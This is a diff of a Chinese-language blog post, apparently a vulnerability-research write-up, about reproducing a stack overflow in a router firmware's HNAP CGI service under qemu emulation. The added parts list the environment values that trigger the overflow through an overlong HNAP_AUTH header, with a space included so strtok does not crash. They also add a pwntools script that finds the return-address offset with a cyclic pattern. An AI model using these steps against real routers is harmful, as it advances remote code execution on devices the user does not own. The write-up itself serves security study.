@@ -162,6 +162,7 @@
 &lt;img src=&#34;13.png&#34; style=&#34;width: 90%;&#34; /&gt;
 &lt;p&gt;打开&lt;code&gt;ida&lt;/code&gt;，选择&lt;code&gt;debugger&lt;/code&gt;开启&lt;code&gt;gdb&lt;/code&gt;调试，然后选择&lt;code&gt;process options&lt;/code&gt;，填入刚刚的&lt;code&gt;ip&lt;/code&gt;和端口&lt;/p&gt;
 &lt;img src=&#34;14.png&#34; style=&#34;width: 50%;&#34; /&gt;
+&lt;img src=&#34;24.png&#34; style=&#34;width: 50%;&#34; /&gt;
 &lt;p&gt;按&lt;code&gt;f9&lt;/code&gt;运行，确认弹窗后来到这个界面说明成功接入调试器&lt;/p&gt;
 &lt;img src=&#34;15.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;我先前在程序中打过断点，进入后按一次&lt;code&gt;f9&lt;/code&gt;，程序执行后停在第一个断点处，然后按&lt;code&gt;f5&lt;/code&gt;就可以查看伪代码，暗紫色就是程序停住的地方，分析完一句便按&lt;code&gt;f9&lt;/code&gt;继续&lt;/p&gt;
@@ -225,17 +226,8 @@
 &lt;p&gt;返回如下&lt;/p&gt;
 &lt;img src=&#34;22.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h2 id=&#34;验证&#34;&gt;验证
-&lt;/h2&gt;&lt;p&gt;确认如下条件成立：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;REQUEST_METHOD=&amp;quot;POST&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;SOAP_ACTION=&amp;quot;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;CONTENT_LENGTH=&amp;quot;$(wc -c &amp;lt; /stdin.txt)&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;COOKIE=&amp;quot;uid=&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;HNAP_AUTH=&amp;quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;固件根目录下存在&lt;code&gt;/tmp&lt;/code&gt;目录&lt;/li&gt;
-&lt;li&gt;固件根目录下有&lt;code&gt;stdin.txt&lt;/code&gt;，里面写入构造的xml&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;开启调试&lt;/p&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;成功溢出&#34;&gt;成功溢出
+&lt;/h3&gt;&lt;p&gt;开启调试&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -248,6 +240,20 @@
 &lt;img src=&#34;19.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;p&gt;最终来到&lt;code&gt;strcpy(v28, DANGER_IVAR);&lt;/code&gt;，成功产生了栈溢出&lt;/p&gt;
 &lt;img src=&#34;21.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;h3 id=&#34;错误修改&#34;&gt;错误修改
+&lt;/h3&gt;&lt;p&gt;这里注意到产生溢出后继续执行，会产生报错，指向2B43D76C&lt;/p&gt;
+&lt;img src=&#34;23.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;p&gt;在溢出这一句之后有这样的一句v19 = strtok(v28, &amp;quot; &amp;ldquo;);，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成/x00，然后将前半部分的内容赋值v19。后面还有v20 = strtok(0, &amp;quot; &amp;ldquo;);，也就是接着上一句的位置再分割一次。为了防止报错，实现时应该在HNAP_AUTH里加上一个空格&lt;/p&gt;
+&lt;p&gt;因此最终确认产生溢出，并保证程序正常执行需要如下条件成立：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;REQUEST_METHOD=&amp;quot;POST&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SOAP_ACTION=&amp;quot;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CONTENT_LENGTH=&amp;quot;$(wc -c &amp;lt; /stdin.txt)&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;COOKIE=&amp;quot;uid=&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;HNAP_AUTH=超过256字节大小的字符串，其中包含一个空格&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;固件根目录下存在&lt;code&gt;/tmp&lt;/code&gt;目录&lt;/li&gt;
+&lt;li&gt;固件根目录下有&lt;code&gt;stdin.txt&lt;/code&gt;，里面写入构造的xml&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
 &lt;/h2&gt;&lt;h3 id=&#34;原理&#34;&gt;原理
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;常见寄存器&lt;/strong&gt;：&lt;/p&gt;
@@ -262,9 +268,78 @@
 &lt;p&gt;&lt;strong&gt;栈溢出原理&lt;/strong&gt;：&lt;/p&gt;
 &lt;p&gt;假如向原本预留了&lt;code&gt;40&lt;/code&gt;字节的变量中存入&lt;code&gt;100&lt;/code&gt;字节的值，那么在预留内存满后，多出来的部分会继续向高地址存储，最终覆盖最初存储的返回地址。继续往下执行到&lt;code&gt;return&lt;/code&gt;后，它会取到错误的地址并赋值给&lt;code&gt;ip&lt;/code&gt;寄存器，这个地址可能指向错误的位置，更可能在内存中不存在，程序就会直接崩溃&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;栈溢出的利用&lt;/strong&gt;：&lt;/p&gt;
-&lt;p&gt;如果在溢出的输入中夹杂一个地址，让这个地址正好覆盖在返回地址的位置，而地址指向的是某个后门函数，那么函数返回后，程序执行流被劫持到后门函数，就导致非法执行&lt;/p&gt;
+&lt;p&gt;如果在溢出的输入中夹杂一个地址，让这个地址正好覆盖在返回地址的位置，而地址指向的是某个后门函数，那么函数返回后，程序执行流被劫持到后门函数，就会导致非法执行&lt;/p&gt;
 &lt;h3 id=&#34;构造可回显rce栈溢出&#34;&gt;构造可回显rce栈溢出
-&lt;/h3&gt;&lt;p&gt;由于命令行无法处理部分特殊字符，这一步采用python来实现&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;之前将HNAP_AUTH的值设定为多个a，那么溢出后的返回地址也会变成4个a的十六进制，这样便无法找到HNAP_AUTH中具体第几个字符覆盖了返回地址。因此这里需要采用cyclic字符串，也就是一种每四个字节都独一无二的字符串。然后通过获取返回地址的十六进制，在cyclic字符串中找到对应的四个字符，从而获取所需位置&lt;/p&gt;
+&lt;p&gt;在溢出这一句之后有这样的一句v19 = strtok(v28, &amp;quot; &amp;ldquo;);，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成/x00。后面还有v20 = strtok(0, &amp;quot; &amp;ldquo;);，也就是接着上一句的位置再分割一次。为了防止报错，实现时应该在HNAP_AUTH末尾加上两个空格&lt;/p&gt;
+&lt;p&gt;由于命令行无法处理部分特殊字符，这一步采用python来实现&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;subprocess&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chroot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;soap:Body&amp;gt;&amp;lt;m:GetPrice xmlns:m=&amp;#34;http://www.w3schools.com/prices&amp;#34;&amp;gt;&amp;lt;m:Item&amp;gt;Apples&amp;lt;/m:Item&amp;gt;&amp;lt;/m:GetPrice&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;REQUEST_METHOD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SOAP_ACTION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;CONTENT_LENGTH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;COOKIE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uid=&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;  aaa&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HNAP_AUTH: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/qemu-mips-static&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;-g&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/web/cgi-bin/hnap/hnap_service&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REQUEST_METHOD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;SOAP_ACTION&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SOAP_ACTION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;CONTENT_LENGTH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CONTENT_LENGTH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;COOKIE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;HNAP_AUTH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;运行程序后进行调试，可以看到提示返回值是6A61616C，也就是jaal&lt;/p&gt;
+&lt;img src=&#34;25.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;p&gt;在字符串中成功定位&lt;/p&gt;
 </description>
         </item>
         
